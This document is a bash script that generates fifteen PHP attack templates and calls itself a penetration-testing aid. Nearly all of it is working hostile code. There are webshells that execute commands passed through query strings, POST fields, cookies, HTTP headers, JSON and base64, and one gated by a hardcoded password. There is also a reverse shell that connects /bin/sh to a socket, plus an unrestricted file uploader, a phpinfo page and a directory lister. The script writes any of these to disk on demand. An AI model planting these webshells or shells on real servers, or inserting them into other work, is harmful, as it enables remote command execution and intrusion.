#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Log functions
success() { 
    echo -e "${GREEN}[✓]${NC} :: $1" 
}

info() { 
    echo -e "${BLUE}[i]${NC} :: $1" 
}

warning() { 
    echo -e "${YELLOW}[!]${NC} :: $1" 
}

error() { 
    echo -e "${RED}[✗]${NC} :: $1" 
}

section() { 
    echo -e "${CYAN}[ $1 ]${NC}" 
}

# PHP Security Templates Generator
# Description: Generates PHP templates for security testing and penetration testing
# Features:
#   * 15 different PHP templates including webshells, reverse shells, and utilities
#   * Two modes: display templates on screen or create files in current directory
#   * For educational and authorized security testing only

# Function to print usage information
print_usage() {
    echo -e "${CYAN}[ Usage ]${NC}"
    echo "Usage: $0 <mode> [template_number]"
    echo ""
    echo "Modes:"
    echo "  1 # Display all PHP templates on screen"
    echo "  2 # Create specific template file in current directory"
    echo ""
    echo "Arguments:"
    echo "  mode            # Operation mode: 1 (display) or 2 (create file)"
    echo "  template_number # Template number to create (only for mode 2)"
    echo ""
    echo "Examples:"
    echo "  $0 1   # Display all templates"
    echo "  $0 2 3 # Create template 3 in current directory"
    echo "  $0 2 5 # Create template 5 in current directory"
}

# Check for help flag or no arguments
if [ $# -eq 0 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
    print_usage
    exit 0
fi

# Parse command line arguments
MODE="$1"
TEMPLATE_NUM="$2"

# Validations
if [ -z "$MODE" ]; then
    error "No mode specified"
    print_usage
    exit 1
fi

if [ "$MODE" != "1" ] && [ "$MODE" != "2" ]; then
    error "Invalid mode. Must be 1 or 2"
    print_usage
    exit 1
fi

if [ "$MODE" = "2" ] && [ -z "$TEMPLATE_NUM" ]; then
    error "Template number required for mode 2"
    print_usage
    exit 1
fi

section "PHP Templates Generator for Security Testing"

# Define all templates with their numbers
declare -A TEMPLATES

TEMPLATES[1]='basic_system.php'
TEMPLATES[2]='basic_shell_exec.php'
TEMPLATES[3]='basic_passthru.php'
TEMPLATES[4]='auth_webshell.php'
TEMPLATES[5]='multi_method_webshell.php'
TEMPLATES[6]='reverse_shell.php'
TEMPLATES[7]='file_uploader.php'
TEMPLATES[8]='info_disclosure.php'
TEMPLATES[9]='directory_lister.php'
TEMPLATES[10]='command_injection_tester.php'
TEMPLATES[11]='base64_webshell.php'
TEMPLATES[12]='json_webshell.php'
TEMPLATES[13]='cookie_webshell.php'
TEMPLATES[14]='header_webshell.php'
TEMPLATES[15]='post_webshell.php'

# Define template contents
declare -A CONTENTS

CONTENTS["basic_system.php"]='<?php
if(isset($_GET["cmd"])) {
    system($_GET["cmd"]);
}
?>'

CONTENTS["basic_shell_exec.php"]='<?php
if(isset($_GET["exec"])) {
    echo shell_exec($_GET["exec"]);
}
?>'

CONTENTS["basic_passthru.php"]='<?php
if(isset($_GET["pass"])) {
    passthru($_GET["pass"]);
}
?>'

CONTENTS["auth_webshell.php"]='<?php
$password = "hackthebox";
if(isset($_GET["pass"]) && $_GET["pass"] == $password) {
    if(isset($_GET["cmd"])) {
        system($_GET["cmd"]);
    }
}
?>'

CONTENTS["multi_method_webshell.php"]='<?php
if(isset($_REQUEST["cmd"])) {
    $cmd = $_REQUEST["cmd"];
    
    if(function_exists("system")) {
        system($cmd);
    } elseif(function_exists("shell_exec")) {
        echo shell_exec($cmd);
    } elseif(function_exists("exec")) {
        exec($cmd, $output);
        print_r($output);
    } elseif(function_exists("passthru")) {
        passthru($cmd);
    } elseif(function_exists("proc_open")) {
        $proc = proc_open($cmd, array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        ), $pipes);
        echo stream_get_contents($pipes[1]);
        proc_close($proc);
    } else {
        echo "No execution functions available";
    }
}
?>'

CONTENTS["reverse_shell.php"]='<?php
$ip = "127.0.0.1";
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>'

CONTENTS["file_uploader.php"]='<?php
if(isset($_FILES["file"])) {
    $upload_dir = ".";
    $filename = basename($_FILES["file"]["name"]);
    $target_file = $upload_dir . "/" . $filename;
    
    if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        echo "File uploaded successfully: " . $filename;
    } else {
        echo "File upload failed";
    }
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>'

CONTENTS["info_disclosure.php"]='<?php
phpinfo();
?>'

CONTENTS["directory_lister.php"]='<?php
$dir = isset($_GET["dir"]) ? $_GET["dir"] : ".";
$files = scandir($dir);
foreach($files as $file) {
    echo htmlspecialchars($file) . "<br>";
}
?>'

CONTENTS["command_injection_tester.php"]='<?php
if(isset($_GET["input"])) {
    $input = $_GET["input"];
    echo "Testing: " . htmlspecialchars($input) . "<br>";
    echo "Result: ";
    system("echo " . $input);
}
?>'

CONTENTS["base64_webshell.php"]='<?php
if(isset($_GET["c"])) {
    $cmd = base64_decode($_GET["c"]);
    system($cmd);
}
?>'

CONTENTS["json_webshell.php"]='<?php
if(isset($_GET["data"])) {
    $data = json_decode($_GET["data"], true);
    if(isset($data["cmd"])) {
        system($data["cmd"]);
    }
}
?>'

CONTENTS["cookie_webshell.php"]='<?php
if(isset($_COOKIE["cmd"])) {
    system($_COOKIE["cmd"]);
}
?>'

CONTENTS["header_webshell.php"]='<?php
if(isset($_SERVER["HTTP_CMD"])) {
    system($_SERVER["HTTP_CMD"]);
}
?>'

CONTENTS["post_webshell.php"]='<?php
if($_SERVER["REQUEST_METHOD"] == "POST") {
    if(isset($_POST["command"])) {
        system($_POST["command"]);
    }
}
?>
<form method="POST">
    <input type="text" name="command" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>'

# Execute based on selected mode
if [ "$MODE" = "1" ]; then
    info "Display mode: Showing ${#TEMPLATES[@]} PHP templates"
    echo ""
    
    for i in {1..15}; do
        template_name="${TEMPLATES[$i]}"
        echo -e "${YELLOW}[ Template $i: $template_name ]${NC}"
        echo "${CONTENTS[$template_name]}"
        echo ""
    done
    
    success "Display completed: ${#TEMPLATES[@]} templates shown"
    
elif [ "$MODE" = "2" ]; then
    # Validate template number
    if [[ ! "$TEMPLATE_NUM" =~ ^[0-9]+$ ]] || [ "$TEMPLATE_NUM" -lt 1 ] || [ "$TEMPLATE_NUM" -gt "${#TEMPLATES[@]}" ]; then
        error "Invalid template number. Must be between 1 and ${#TEMPLATES[@]}"
        echo "Available templates:"
        for i in {1..15}; do
            echo "  $i. ${TEMPLATES[$i]}"
        done
        exit 1
    fi
    
    template_name="${TEMPLATES[$TEMPLATE_NUM]}"
    info "Creating template $TEMPLATE_NUM: $template_name"
    
    # Create file in current directory
    filename="$template_name"
    echo "${CONTENTS[$template_name]}" > "$filename"
    
    success "File created: $filename in current directory"
    echo "File size: $(wc -c < "$filename") bytes"
fi
